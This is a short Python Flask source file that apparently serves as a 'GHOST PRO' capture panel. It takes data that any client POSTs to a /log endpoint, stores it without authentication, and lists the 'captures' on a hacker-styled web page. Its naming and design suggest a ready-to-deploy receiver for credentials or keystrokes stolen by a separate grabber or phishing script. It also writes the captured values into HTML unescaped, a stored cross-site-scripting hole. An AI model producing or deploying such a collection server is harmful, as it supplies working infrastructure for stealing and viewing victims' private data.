from flask import Flask, request, jsonify
import os

app = Flask(__name__)
logs = []

@app.route('/')
def home():
    # تصميم احترافي داخل الكود مباشرة
    html = """
    <body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
        <h1>💀 GHOST PRO LIVE 💀</h1>
        <hr>
        <h3>Captures: {count}</h3>
        <ul>{items}</ul>
    </body>
    """
    items = "".join([f"<li>{l}</li>" for l in logs[::-1]])
    return html.format(count=len(logs), items=items)

@app.route('/log', methods=['POST'])
def log_data():
    data = request.json
    if data and "info" in data:
        logs.append(data["info"])
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "error"}), 400

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
